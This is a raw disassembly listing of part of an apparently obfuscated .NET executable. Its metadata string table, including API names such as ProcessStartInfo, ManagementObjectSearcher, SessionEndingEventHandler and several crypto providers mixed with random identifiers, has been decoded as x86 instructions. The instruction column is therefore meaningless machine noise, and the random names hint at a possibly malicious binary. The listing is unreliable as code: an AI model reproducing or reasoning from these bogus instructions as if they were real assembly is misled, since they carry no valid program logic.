  40906c:	65 72 61             	gs jb  0x4090d0
  40906f:	6e                   	outsb  %ds:(%esi),(%dx)
  409070:	00 4e 69             	add    %cl,0x69(%esi)
  409073:	74 6b                	je     0x4090e0
  409075:	4a                   	dec    %edx
  409076:	4a                   	dec    %edx
  409077:	64 4b                	fs dec %ebx
  409079:	74 72                	je     0x4090ed
  40907b:	50                   	push   %eax
  40907c:	68 6e 00 6b 43       	push   $0x436b006e
  409081:	53                   	push   %ebx
  409082:	51                   	push   %ecx
  409083:	49                   	dec    %ecx
  409084:	75 51                	jne    0x4090d7
  409086:	4c                   	dec    %esp
  409087:	6d                   	insl   (%dx),%es:(%edi)
  409088:	51                   	push   %ecx
  409089:	69 6e 00 4d 61 69 6e 	imul   $0x6e69614d,0x0(%esi),%ebp
  409090:	00 58 35             	add    %bl,0x35(%eax)
  409093:	30 39                	xor    %bh,(%ecx)
  409095:	43                   	inc    %ebx
  409096:	68 61 69 6e 00       	push   $0x6e6961
  40909b:	41                   	inc    %ecx
  40909c:	70 70                	jo     0x40910e
  40909e:	44                   	inc    %esp
  40909f:	6f                   	outsl  %ds:(%esi),(%dx)
  4090a0:	6d                   	insl   (%dx),%es:(%edi)
  4090a1:	61                   	popa
  4090a2:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4090a9:	43                   	inc    %ebx
  4090aa:	75 72                	jne    0x40911e
  4090ac:	72 65                	jb     0x409113
  4090ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4090af:	74 44                	je     0x4090f5
  4090b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4090b2:	6d                   	insl   (%dx),%es:(%edi)
  4090b3:	61                   	popa
  4090b4:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  4090bb:	00 47 65             	add    %al,0x65(%edi)
  4090be:	74 46                	je     0x409106
  4090c0:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  4090c7:	57 
  4090c8:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  4090cf:	78 
  4090d0:	74 65                	je     0x409137
  4090d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d3:	73 69                	jae    0x40913e
  4090d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4090d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d7:	00 67 65             	add    %ah,0x65(%edi)
  4090da:	74 5f                	je     0x40913b
  4090dc:	4f                   	dec    %edi
  4090dd:	53                   	push   %ebx
  4090de:	56                   	push   %esi
  4090df:	65 72 73             	gs jb  0x409155
  4090e2:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4090e9:	74 65                	je     0x409150
  4090eb:	6d                   	insl   (%dx),%es:(%edi)
  4090ec:	2e 49                	cs dec %ecx
  4090ee:	4f                   	dec    %edi
  4090ef:	2e 43                	cs inc %ebx
  4090f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f2:	6d                   	insl   (%dx),%es:(%edi)
  4090f3:	70 72                	jo     0x409167
  4090f5:	65 73 73             	gs jae 0x40916b
  4090f8:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  4090ff:	6c                   	insb   (%dx),%es:(%edi)
  409100:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  409107:	00 53 79             	add    %dl,0x79(%ebx)
  40910a:	73 74                	jae    0x409180
  40910c:	65 6d                	gs insl (%dx),%es:(%edi)
  40910e:	2e 53                	cs push %ebx
  409110:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409114:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  40911b:	68 
  40911c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40911e:	74 69                	je     0x409189
  409120:	63 61 74             	arpl   %esp,0x74(%ecx)
  409123:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40912a:	74 65                	je     0x409191
  40912c:	6d                   	insl   (%dx),%es:(%edi)
  40912d:	2e 52                	cs push %edx
  40912f:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  409132:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409137:	6e                   	outsb  %ds:(%esi),(%dx)
  409138:	00 58 35             	add    %bl,0x35(%eax)
  40913b:	30 39                	xor    %bh,(%ecx)
  40913d:	43                   	inc    %ebx
  40913e:	65 72 74             	gs jb  0x4091b5
  409141:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  409148:	43                   	inc    %ebx
  409149:	6f                   	outsl  %ds:(%esi),(%dx)
  40914a:	6c                   	insb   (%dx),%es:(%edi)
  40914b:	6c                   	insb   (%dx),%es:(%edi)
  40914c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409151:	6e                   	outsb  %ds:(%esi),(%dx)
  409152:	00 4d 61             	add    %cl,0x61(%ebp)
  409155:	6e                   	outsb  %ds:(%esi),(%dx)
  409156:	61                   	popa
  409157:	67 65 6d             	gs insl (%dx),%es:(%di)
  40915a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40915c:	74 4f                	je     0x4091ad
  40915e:	62 6a 65             	bound  %ebp,0x65(%edx)
  409161:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  409165:	6c                   	insb   (%dx),%es:(%edi)
  409166:	6c                   	insb   (%dx),%es:(%edi)
  409167:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40916c:	6e                   	outsb  %ds:(%esi),(%dx)
  40916d:	00 73 65             	add    %dh,0x65(%ebx)
  409170:	74 5f                	je     0x4091d1
  409172:	50                   	push   %eax
  409173:	6f                   	outsl  %ds:(%esi),(%dx)
  409174:	73 69                	jae    0x4091df
  409176:	74 69                	je     0x4091e1
  409178:	6f                   	outsl  %ds:(%esi),(%dx)
  409179:	6e                   	outsb  %ds:(%esi),(%dx)
  40917a:	00 43 72             	add    %al,0x72(%ebx)
  40917d:	79 70                	jns    0x4091ef
  40917f:	74 6f                	je     0x4091f0
  409181:	67 72 61             	addr16 jb 0x4091e5
  409184:	70 68                	jo     0x4091ee
  409186:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  40918d:	74 69                	je     0x4091f8
  40918f:	6f                   	outsl  %ds:(%esi),(%dx)
  409190:	6e                   	outsb  %ds:(%esi),(%dx)
  409191:	00 41 72             	add    %al,0x72(%ecx)
  409194:	67 75 6d             	addr16 jne 0x409204
  409197:	65 6e                	outsb  %gs:(%esi),(%dx)
  409199:	74 4e                	je     0x4091e9
  40919b:	75 6c                	jne    0x409209
  40919d:	6c                   	insb   (%dx),%es:(%edi)
  40919e:	45                   	inc    %ebp
  40919f:	78 63                	js     0x409204
  4091a1:	65 70 74             	gs jo  0x409218
  4091a4:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  4091ab:	75 6d                	jne    0x40921a
  4091ad:	65 6e                	outsb  %gs:(%esi),(%dx)
  4091af:	74 45                	je     0x4091f6
  4091b1:	78 63                	js     0x409216
  4091b3:	65 70 74             	gs jo  0x40922a
  4091b6:	69 6f 6e 00 47 41 78 	imul   $0x78414700,0x6e(%edi),%ebp
  4091bd:	53                   	push   %ebx
  4091be:	64 49                	fs dec %ecx
  4091c0:	4b                   	dec    %ebx
  4091c1:	55                   	push   %ebp
  4091c2:	4d                   	dec    %ebp
  4091c3:	55                   	push   %ebp
  4091c4:	46                   	inc    %esi
  4091c5:	58                   	pop    %eax
  4091c6:	46                   	inc    %esi
  4091c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4091c8:	00 73 4d             	add    %dh,0x4d(%ebx)
  4091cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4091cc:	7a 6b                	jp     0x409239
  4091ce:	43                   	inc    %ebx
  4091cf:	64 4c                	fs dec %esp
  4091d1:	44                   	inc    %esp
  4091d2:	57                   	push   %edi
  4091d3:	4d                   	dec    %ebp
  4091d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4091d5:	00 6e 4e             	add    %ch,0x4e(%esi)
  4091d8:	65 73 78             	gs jae 0x409253
  4091db:	45                   	inc    %ebp
  4091dc:	44                   	inc    %esp
  4091dd:	6a 78                	push   $0x78
  4091df:	51                   	push   %ecx
  4091e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4091e1:	00 54 43 77          	add    %dl,0x77(%ebx,%eax,2)
  4091e5:	41                   	inc    %ecx
  4091e6:	63 63 54             	arpl   %esp,0x54(%ebx)
  4091e9:	76 51                	jbe    0x40923c
  4091eb:	70 6c                	jo     0x409259
  4091ed:	66 6f                	outsw  %ds:(%esi),(%dx)
  4091ef:	00 49 6d             	add    %cl,0x6d(%ecx)
  4091f2:	61                   	popa
  4091f3:	67 65 43             	addr16 gs inc %ebx
  4091f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4091f7:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  4091fc:	66 6f                	outsw  %ds:(%esi),(%dx)
  4091fe:	00 46 69             	add    %al,0x69(%esi)
  409201:	6c                   	insb   (%dx),%es:(%edi)
  409202:	65 49                	gs dec %ecx
  409204:	6e                   	outsb  %ds:(%esi),(%dx)
  409205:	66 6f                	outsw  %ds:(%esi),(%dx)
  409207:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  40920b:	76 65                	jbe    0x409272
  40920d:	49                   	dec    %ecx
  40920e:	6e                   	outsb  %ds:(%esi),(%dx)
  40920f:	66 6f                	outsw  %ds:(%esi),(%dx)
  409211:	00 46 69             	add    %al,0x69(%esi)
  409214:	6c                   	insb   (%dx),%es:(%edi)
  409215:	65 53                	gs push %ebx
  409217:	79 73                	jns    0x40928c
  409219:	74 65                	je     0x409280
  40921b:	6d                   	insl   (%dx),%es:(%edi)
  40921c:	49                   	dec    %ecx
  40921d:	6e                   	outsb  %ds:(%esi),(%dx)
  40921e:	66 6f                	outsw  %ds:(%esi),(%dx)
  409220:	00 43 6f             	add    %al,0x6f(%ebx)
  409223:	6d                   	insl   (%dx),%es:(%edi)
  409224:	70 75                	jo     0x40929b
  409226:	74 65                	je     0x40928d
  409228:	72 49                	jb     0x409273
  40922a:	6e                   	outsb  %ds:(%esi),(%dx)
  40922b:	66 6f                	outsw  %ds:(%esi),(%dx)
  40922d:	00 43 53             	add    %al,0x53(%ebx)
  409230:	68 61 72 70 41       	push   $0x41707261
  409235:	72 67                	jb     0x40929e
  409237:	75 6d                	jne    0x4092a6
  409239:	65 6e                	outsb  %gs:(%esi),(%dx)
  40923b:	74 49                	je     0x409286
  40923d:	6e                   	outsb  %ds:(%esi),(%dx)
  40923e:	66 6f                	outsw  %ds:(%esi),(%dx)
  409240:	00 50 72             	add    %dl,0x72(%eax)
  409243:	6f                   	outsl  %ds:(%esi),(%dx)
  409244:	63 65 73             	arpl   %esp,0x73(%ebp)
  409247:	73 53                	jae    0x40929c
  409249:	74 61                	je     0x4092ac
  40924b:	72 74                	jb     0x4092c1
  40924d:	49                   	dec    %ecx
  40924e:	6e                   	outsb  %ds:(%esi),(%dx)
  40924f:	66 6f                	outsw  %ds:(%esi),(%dx)
  409251:	00 47 54             	add    %al,0x54(%edi)
  409254:	66 43                	inc    %bx
  409256:	63 75 52             	arpl   %esi,0x52(%ebp)
  409259:	67 6c                	insb   (%dx),%es:(%di)
  40925b:	6f                   	outsl  %ds:(%esi),(%dx)
  40925c:	00 79 6b             	add    %bh,0x6b(%ecx)
  40925f:	65 66 41             	gs inc %cx
  409262:	62 6c 48 6e          	bound  %ebp,0x6e(%eax,%ecx,2)
  409266:	6f                   	outsl  %ds:(%esi),(%dx)
  409267:	00 77 66             	add    %dh,0x66(%edi)
  40926a:	43                   	inc    %ebx
  40926b:	6e                   	outsb  %ds:(%esi),(%dx)
  40926c:	56                   	push   %esi
  40926d:	75 7a                	jne    0x4092e9
  40926f:	46                   	inc    %esi
  409270:	5a                   	pop    %edx
  409271:	4a                   	dec    %edx
  409272:	6e                   	outsb  %ds:(%esi),(%dx)
  409273:	6f                   	outsl  %ds:(%esi),(%dx)
  409274:	00 42 4e             	add    %al,0x4e(%edx)
  409277:	78 6f                	js     0x4092e8
  409279:	75 42                	jne    0x4092bd
  40927b:	7a 6e                	jp     0x4092eb
  40927d:	66 69 6e 6f 00 7a    	imul   $0x7a00,0x6f(%esi),%bp
  409283:	74 63                	je     0x4092e8
  409285:	72 4c                	jb     0x4092d3
  409287:	50                   	push   %eax
  409288:	6c                   	insb   (%dx),%es:(%edi)
  409289:	52                   	push   %edx
  40928a:	65 79 79             	gs jns 0x409306
  40928d:	6f                   	outsl  %ds:(%esi),(%dx)
  40928e:	00 70 49             	add    %dh,0x49(%eax)
  409291:	76 62                	jbe    0x4092f5
  409293:	6d                   	insl   (%dx),%es:(%edi)
  409294:	48                   	dec    %eax
  409295:	45                   	inc    %ebp
  409296:	75 4c                	jne    0x4092e4
  409298:	41                   	inc    %ecx
  409299:	70 00                	jo     0x40929b
  40929b:	65 44                	gs inc %esp
  40929d:	5a                   	pop    %edx
  40929e:	6f                   	outsl  %ds:(%esi),(%dx)
  40929f:	67 76 7a             	addr16 jbe 0x40931c
  4092a2:	54                   	push   %esp
  4092a3:	41                   	inc    %ecx
  4092a4:	70 00                	jo     0x4092a6
  4092a6:	5a                   	pop    %edx
  4092a7:	56                   	push   %esi
  4092a8:	59                   	pop    %ecx
  4092a9:	4a                   	dec    %edx
  4092aa:	76 51                	jbe    0x4092fd
  4092ac:	42                   	inc    %edx
  4092ad:	79 67                	jns    0x409316
  4092af:	51                   	push   %ecx
  4092b0:	48                   	dec    %eax
  4092b1:	70 00                	jo     0x4092b3
  4092b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b4:	49                   	dec    %ecx
  4092b5:	68 52 75 67 64       	push   $0x64677552
  4092ba:	52                   	push   %edx
  4092bb:	4a                   	dec    %edx
  4092bc:	58                   	pop    %eax
  4092bd:	51                   	push   %ecx
  4092be:	70 00                	jo     0x4092c0
  4092c0:	51                   	push   %ecx
  4092c1:	43                   	inc    %ebx
  4092c2:	4a                   	dec    %edx
  4092c3:	76 59                	jbe    0x40931e
  4092c5:	43                   	inc    %ebx
  4092c6:	45                   	inc    %ebp
  4092c7:	58                   	pop    %eax
  4092c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4092c9:	4a                   	dec    %edx
  4092ca:	51                   	push   %ecx
  4092cb:	55                   	push   %ebp
  4092cc:	70 00                	jo     0x4092ce
  4092ce:	62 5a 45             	bound  %ebx,0x45(%edx)
  4092d1:	65 70 6e             	gs jo  0x409342
  4092d4:	42                   	inc    %edx
  4092d5:	47                   	inc    %edi
  4092d6:	71 53                	jno    0x40932b
  4092d8:	72 58                	jb     0x409332
  4092da:	70 00                	jo     0x4092dc
  4092dc:	53                   	push   %ebx
  4092dd:	6c                   	insb   (%dx),%es:(%edi)
  4092de:	65 65 70 00          	gs gs jo 0x4092e2
  4092e2:	62 4e 68             	bound  %ecx,0x68(%esi)
  4092e5:	79 49                	jns    0x409330
  4092e7:	48                   	dec    %eax
  4092e8:	4b                   	dec    %ebx
  4092e9:	42                   	inc    %edx
  4092ea:	66 56                	push   %si
  4092ec:	4d                   	dec    %ebp
  4092ed:	70 77                	jo     0x409366
  4092ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f0:	54                   	push   %esp
  4092f1:	67 70 00             	addr16 jo 0x4092f4
  4092f4:	64 4a                	fs dec %edx
  4092f6:	43                   	inc    %ebx
  4092f7:	51                   	push   %ecx
  4092f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f9:	64 72 71             	fs jb  0x40936d
  4092fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4092fd:	68 70 00 76 7a       	push   $0x7a760070
  409302:	52                   	push   %edx
  409303:	72 45                	jb     0x40934a
  409305:	6f                   	outsl  %ds:(%esi),(%dx)
  409306:	46                   	inc    %esi
  409307:	56                   	push   %esi
  409308:	70 45                	jo     0x40934f
  40930a:	6e                   	outsb  %ds:(%esi),(%dx)
  40930b:	69 6b 70 00 6c 76 6c 	imul   $0x6c766c00,0x70(%ebx),%ebp
  409312:	58                   	pop    %eax
  409313:	75 59                	jne    0x40936e
  409315:	48                   	dec    %eax
  409316:	6a 45                	push   $0x45
  409318:	4c                   	dec    %esp
  409319:	6c                   	insb   (%dx),%es:(%edi)
  40931a:	70 00                	jo     0x40931c
  40931c:	61                   	popa
  40931d:	54                   	push   %esp
  40931e:	62 64 71 4f          	bound  %esp,0x4f(%ecx,%esi,2)
  409322:	41                   	inc    %ecx
  409323:	48                   	dec    %eax
  409324:	71 4a                	jno    0x409370
  409326:	4e                   	dec    %esi
  409327:	75 58                	jne    0x409381
  409329:	6e                   	outsb  %ds:(%esi),(%dx)
  40932a:	70 00                	jo     0x40932c
  40932c:	4d                   	dec    %ebp
  40932d:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409334:	74 2e                	je     0x409364
  409336:	43                   	inc    %ebx
  409337:	53                   	push   %ebx
  409338:	68 61 72 70 00       	push   $0x707261
  40933d:	4b                   	dec    %ebx
  40933e:	4d                   	dec    %ebp
  40933f:	44                   	inc    %esp
  409340:	72 73                	jb     0x4093b5
  409342:	4c                   	dec    %esp
  409343:	52                   	push   %edx
  409344:	45                   	inc    %ebp
  409345:	58                   	pop    %eax
  409346:	50                   	push   %eax
  409347:	73 70                	jae    0x4093b9
  409349:	00 76 4a             	add    %dh,0x4a(%esi)
  40934c:	58                   	pop    %eax
  40934d:	65 4b                	gs dec %ebx
  40934f:	57                   	push   %edi
  409350:	44                   	inc    %esp
  409351:	67 46                	addr16 inc %esi
  409353:	50                   	push   %eax
  409354:	4a                   	dec    %edx
  409355:	77 70                	ja     0x4093c7
  409357:	00 52 66             	add    %dl,0x66(%edx)
  40935a:	63 74 4a 49          	arpl   %esi,0x49(%edx,%ecx,2)
  40935e:	46                   	inc    %esi
  40935f:	61                   	popa
  409360:	57                   	push   %edi
  409361:	79 70                	jns    0x4093d3
  409363:	00 56 4f             	add    %dl,0x4f(%esi)
  409366:	77 48                	ja     0x4093b0
  409368:	6f                   	outsl  %ds:(%esi),(%dx)
  409369:	77 6a                	ja     0x4093d5
  40936b:	57                   	push   %edi
  40936c:	57                   	push   %edi
  40936d:	66 4c                	dec    %sp
  40936f:	71 00                	jno    0x409371
  409371:	63 78 44             	arpl   %edi,0x44(%eax)
  409374:	72 77                	jb     0x4093ed
  409376:	52                   	push   %edx
  409377:	56                   	push   %esi
  409378:	64 7a 58             	fs jp  0x4093d3
  40937b:	71 00                	jno    0x40937d
  40937d:	56                   	push   %esi
  40937e:	69 75 48 42 62 6d 49 	imul   $0x496d6242,0x48(%ebp),%esi
  409385:	63 71 00             	arpl   %esi,0x0(%ecx)
  409388:	53                   	push   %ebx
  409389:	79 73                	jns    0x4093fe
  40938b:	74 65                	je     0x4093f2
  40938d:	6d                   	insl   (%dx),%es:(%edi)
  40938e:	2e 4c                	cs dec %esp
  409390:	69 6e 71 00 46 41 4b 	imul   $0x4b414600,0x71(%esi),%ebp
  409397:	6e                   	outsb  %ds:(%esi),(%dx)
  409398:	6b 6b 55 75          	imul   $0x75,0x55(%ebx),%ebp
  40939c:	41                   	inc    %ecx
  40939d:	47                   	inc    %edi
  40939e:	77 71                	ja     0x409411
  4093a0:	00 73 54             	add    %dh,0x54(%ebx)
  4093a3:	51                   	push   %ecx
  4093a4:	63 4b 57             	arpl   %ecx,0x57(%ebx)
  4093a7:	4f                   	dec    %edi
  4093a8:	70 71                	jo     0x40941b
  4093aa:	74 58                	je     0x409404
  4093ac:	53                   	push   %ebx
  4093ad:	79 71                	jns    0x409420
  4093af:	00 45 6b             	add    %al,0x6b(%ebp)
  4093b2:	59                   	pop    %ecx
  4093b3:	53                   	push   %ebx
  4093b4:	63 59 58             	arpl   %ebx,0x58(%ecx)
  4093b7:	70 56                	jo     0x40940f
  4093b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4093ba:	4e                   	dec    %esi
  4093bb:	72 00                	jb     0x4093bd
  4093bd:	68 7a 76 62 69       	push   $0x6962767a
  4093c2:	7a 65                	jp     0x409429
  4093c4:	59                   	pop    %ecx
  4093c5:	47                   	inc    %edi
  4093c6:	58                   	pop    %eax
  4093c7:	69 51 72 00 6d 4d 79 	imul   $0x794d6d00,0x72(%ecx),%edx
  4093ce:	44                   	inc    %esp
  4093cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4093d0:	59                   	pop    %ecx
  4093d1:	72 73                	jb     0x409446
  4093d3:	66 6a 65             	pushw  $0x65
  4093d6:	69 52 72 00 43 6c 65 	imul   $0x656c4300,0x72(%edx),%edx
  4093dd:	61                   	popa
  4093de:	72 00                	jb     0x4093e0
  4093e0:	43                   	inc    %ebx
  4093e1:	68 61 72 00 7a       	push   $0x7a007261
  4093e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4093e7:	53                   	push   %ebx
  4093e8:	53                   	push   %ebx
  4093e9:	6a 42                	push   $0x42
  4093eb:	67 50                	addr16 push %eax
  4093ed:	42                   	inc    %edx
  4093ee:	65 63 72 00          	arpl   %esi,%gs:0x0(%edx)
  4093f2:	49                   	dec    %ecx
  4093f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4093f4:	76 6f                	jbe    0x409465
  4093f6:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  4093fa:	6d                   	insl   (%dx),%es:(%edi)
  4093fb:	62 65 72             	bound  %esp,0x72(%ebp)
  4093fe:	00 4d 44             	add    %cl,0x44(%ebp)
  409401:	35 43 72 79 70       	xor    $0x70797243,%eax
  409406:	74 6f                	je     0x409477
  409408:	53                   	push   %ebx
  409409:	65 72 76             	gs jb  0x409482
  40940c:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  409413:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  40941a:	41 
  40941b:	43                   	inc    %ebx
  40941c:	72 79                	jb     0x409497
  40941e:	70 74                	jo     0x409494
  409420:	6f                   	outsl  %ds:(%esi),(%dx)
  409421:	53                   	push   %ebx
  409422:	65 72 76             	gs jb  0x40949b
  409425:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40942c:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  409433:	73 
  409434:	43                   	inc    %ebx
  409435:	72 79                	jb     0x4094b0
  409437:	70 74                	jo     0x4094ad
  409439:	6f                   	outsl  %ds:(%esi),(%dx)
  40943a:	53                   	push   %ebx
  40943b:	65 72 76             	gs jb  0x4094b4
  40943e:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  409445:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  40944c:	72 
  40944d:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  409454:	64 65 72 00          	fs gs jb 0x409458
  409458:	4d                   	dec    %ebp
  409459:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409460:	74 2e                	je     0x409490
  409462:	43                   	inc    %ebx
  409463:	53                   	push   %ebx
  409464:	68 61 72 70 2e       	push   $0x2e707261
  409469:	52                   	push   %edx
  40946a:	75 6e                	jne    0x4094da
  40946c:	74 69                	je     0x4094d7
  40946e:	6d                   	insl   (%dx),%es:(%edi)
  40946f:	65 42                	gs inc %edx
  409471:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  409478:	61                   	popa
  409479:	6c                   	insb   (%dx),%es:(%edi)
  40947a:	6c                   	insb   (%dx),%es:(%edi)
  40947b:	53                   	push   %ebx
  40947c:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  409483:	65 
  409484:	72 00                	jb     0x409486
  409486:	67 65 74 5f          	addr16 gs je 0x4094e9
  40948a:	42                   	inc    %edx
  40948b:	75 66                	jne    0x4094f3
  40948d:	66 65 72 00          	data16 gs jb 0x409491
  409491:	73 65                	jae    0x4094f8
  409493:	74 5f                	je     0x4094f4
  409495:	42                   	inc    %edx
  409496:	75 66                	jne    0x4094fe
  409498:	66 65 72 00          	data16 gs jb 0x40949c
  40949c:	67 65 74 5f          	addr16 gs je 0x4094ff
  4094a0:	41                   	inc    %ecx
  4094a1:	73 49                	jae    0x4094ec
  4094a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4094a4:	74 65                	je     0x40950b
  4094a6:	67 65 72 00          	addr16 gs jb 0x4094aa
  4094aa:	73 65                	jae    0x409511
  4094ac:	74 5f                	je     0x40950d
  4094ae:	41                   	inc    %ecx
  4094af:	73 49                	jae    0x4094fa
  4094b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4094b2:	74 65                	je     0x409519
  4094b4:	67 65 72 00          	addr16 gs jb 0x4094b8
  4094b8:	4d                   	dec    %ebp
  4094b9:	61                   	popa
  4094ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4094bb:	61                   	popa
  4094bc:	67 65 6d             	gs insl (%dx),%es:(%di)
  4094bf:	65 6e                	outsb  %gs:(%esi),(%dx)
  4094c1:	74 4f                	je     0x409512
  4094c3:	62 6a 65             	bound  %ebp,0x65(%edx)
  4094c6:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  4094ca:	61                   	popa
  4094cb:	72 63                	jb     0x409530
  4094cd:	68 65 72 00 53       	push   $0x53007265
  4094d2:	65 73 73             	gs jae 0x409548
  4094d5:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4094dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4094dd:	67 45                	addr16 inc %ebp
  4094df:	76 65                	jbe    0x409546
  4094e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4094e2:	74 48                	je     0x40952c
  4094e4:	61                   	popa
  4094e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4094e6:	64 6c                	fs insb (%dx),%es:(%edi)
  4094e8:	65 72 00             	gs jb  0x4094eb
  4094eb:	54                   	push   %esp
  4094ec:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  4094f3:	55                   	push   %ebp
  4094f4:	70 70                	jo     0x409566
  4094f6:	65 72 00             	gs jb  0x4094f9
  4094f9:	43                   	inc    %ebx
  4094fa:	75 72                	jne    0x40956e
  4094fc:	72 65                	jb     0x409563
  4094fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4094ff:	74 55                	je     0x409556
  409501:	73 65                	jae    0x409568
  409503:	72 00                	jb     0x409505
  409505:	53                   	push   %ebx
  409506:	74 72                	je     0x40957a
  409508:	65 61                	gs popa
  40950a:	6d                   	insl   (%dx),%es:(%edi)
  40950b:	57                   	push   %edi
  40950c:	72 69                	jb     0x409577
  40950e:	74 65                	je     0x409575
  409510:	72 00                	jb     0x409512
  409512:	54                   	push   %esp
  409513:	65 78 74             	gs js  0x40958a
  409516:	57                   	push   %edi
  409517:	72 69                	jb     0x409582
  409519:	74 65                	je     0x409580
  40951b:	72 00                	jb     0x40951d
  40951d:	45                   	inc    %ebp
  40951e:	6e                   	outsb  %ds:(%esi),(%dx)
  40951f:	74 65                	je     0x409586
  409521:	72 00                	jb     0x409523
  409523:	42                   	inc    %edx
  409524:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  40952b:	72 
  40952c:	74 65                	je     0x409593
  40952e:	72 00                	jb     0x409530
  409530:	54                   	push   %esp
  409531:	6f                   	outsl  %ds:(%esi),(%dx)
  409532:	4c                   	dec    %esp
  409533:	6f                   	outsl  %ds:(%esi),(%dx)
  409534:	77 65                	ja     0x40959b
  409536:	72 00                	jb     0x409538
  409538:	41                   	inc    %ecx
  409539:	4a                   	dec    %edx
  40953a:	44                   	inc    %esp
  40953b:	69 63 74 65 70 47 6c 	imul   $0x6c477065,0x74(%ebx),%esp
  409542:	73 56                	jae    0x40959a
  409544:	6b 74 6d 72 00       	imul   $0x0,0x72(%ebp,%ebp,2),%esi
  409549:	49                   	dec    %ecx
  40954a:	45                   	inc    %ebp
  40954b:	6e                   	outsb  %ds:(%esi),(%dx)
  40954c:	75 6d                	jne    0x4095bb
  40954e:	65 72 61             	gs jb  0x4095b2
  409551:	74 6f                	je     0x4095c2
  409553:	72 00                	jb     0x409555
  409555:	4d                   	dec    %ebp
  409556:	61                   	popa
  409557:	6e                   	outsb  %ds:(%esi),(%dx)
  409558:	61                   	popa
  409559:	67 65 6d             	gs insl (%dx),%es:(%di)
  40955c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40955e:	74 4f                	je     0x4095af
  409560:	62 6a 65             	bound  %ebp,0x65(%edx)
  409563:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  409567:	75 6d                	jne    0x4095d6
  409569:	65 72 61             	gs jb  0x4095cd
  40956c:	74 6f                	je     0x4095dd
  40956e:	72 00                	jb     0x409570
  409570:	53                   	push   %ebx
  409571:	79 73                	jns    0x4095e6
  409573:	74 65                	je     0x4095da
  409575:	6d                   	insl   (%dx),%es:(%edi)
  409576:	2e 43                	cs inc %ebx
  409578:	6f                   	outsl  %ds:(%esi),(%dx)
  409579:	6c                   	insb   (%dx),%es:(%edi)
  40957a:	6c                   	insb   (%dx),%es:(%edi)
